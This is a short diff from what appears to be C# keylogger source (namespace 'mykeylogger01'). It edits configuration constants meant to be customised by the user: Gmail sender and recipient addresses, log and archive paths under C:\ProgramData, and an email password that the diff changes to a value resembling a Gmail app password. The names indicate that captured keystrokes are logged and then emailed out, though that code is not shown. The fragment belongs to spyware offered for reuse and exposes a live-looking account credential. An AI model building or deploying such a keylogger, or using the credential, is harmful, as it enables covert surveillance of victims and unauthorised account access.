@@ -12,7 +12,7 @@ namespace mykeylogger01
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
         private const string FROM_EMAIL_ADDRESS = "scipio.testing@gmail.com";
-        private const string FROM_EMAIL_PASSWORD = "scipio123";
+        private const string FROM_EMAIL_PASSWORD = "lnjp ashq hhhd xgid";
         private const string TO_EMAIL_ADDRESS = "scipio.testing@gmail.com";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
